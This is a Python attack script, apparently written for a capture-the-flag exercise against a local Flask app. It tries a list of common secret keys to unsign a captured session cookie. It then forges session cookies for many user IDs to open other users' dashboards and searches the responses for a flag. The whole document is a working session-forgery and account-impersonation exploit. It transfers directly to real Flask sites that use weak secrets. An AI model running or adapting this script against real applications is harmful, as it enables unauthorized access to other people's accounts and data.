import requests
import re
import hmac
import hashlib
import base64
import json
from itsdangerous import URLSafeTimedSerializer, BadSignature

BASE_URL = "http://127.0.0.1:32883"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Attempting to forge Flask session cookies with common secret keys\n")

# Common Flask secret keys to try
common_secrets = [
    "secret",
    "dev",
    "development",
    "test", 
    "testing",
    "password",
    "admin",
    "flask",
    "supersecretkey",
    "changeme",
    "secret_key",
    "your-secret-key",
    "mysecret",
    "12345",
    "default"
]

# Known valid session for reference
known_session = "eyJ1c2VyX2lkIjoxMDAzMn0.aVr07Q.Mx69DlSJN-eEryAmVre6uHt2he8"

print(f"[+] Known session: {known_session}")
print(f"[+] Trying {len(common_secrets)} common secret keys\n")

for secret in common_secrets:
    try:
        # Try to unsign the known session with this secret
        serializer = URLSafeTimedSerializer(secret)
        
        try:
            # If this succeeds, we found the secret!
            data = serializer.loads(known_session)
            print(f"[!!!] SECRET KEY FOUND: '{secret}'")
            print(f"  Decoded session data: {data}\n")
            
            # Now forge sessions with different user_ids
            print(f"[+] Forging session cookies with different user_ids\n")
            
            test_user_ids = list(range(1, 20)) + [100, 1000, 9999, 10000, 10001, 10031, 10033, 10034, 10035, 50000, 99999]
            
            for user_id in test_user_ids:
                # Create forged session
                forged_data = {'user_id': user_id}
                forged_session = serializer.dumps(forged_data)
                
                # Try to access dashboard with forged session
                cookies = {'session': forged_session}
                
                try:
                    dash_resp = requests.get(DASHBOARD_URL, cookies=cookies, timeout=5)
                    
                    if dash_resp.status_code == 200:
                        print(f"[+] SUCCESS for user_id={user_id}")
                        print(f"    Response length: {len(dash_resp.text)}B")
                        
                        # Check for FLAG
                        flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
                        if flag_match:
                            print(f"\n{'='*60}")
                            print(f"[!] FLAG FOUND with user_id={user_id}")
                            print(f"[!] FLAG: {flag_match.group(0)}")
                            print(f"{'='*60}")
                            print(f"\n[+] Full Dashboard Response:")
                            print(dash_resp.text)
                            print(f"\n{'='*60}\n")
                            break
                        else:
                            # Print snippet if response is different from error page
                            if len(dash_resp.text) > 300:
                                print(f"    Snippet: {dash_resp.text[:400]}")
                    elif dash_resp.status_code != 500:
                        print(f"[*] user_id={user_id}: Status {dash_resp.status_code}")
                        if len(dash_resp.text) < 500:
                            print(f"    Response: {dash_resp.text}")
                except Exception as e:
                    pass
            
            break  # Stop trying other secrets once we found the right one
            
        except BadSignature:
            # Wrong secret, continue
            pass
            
    except Exception as e:
        pass

print("\n[*] Secret key brute force complete")

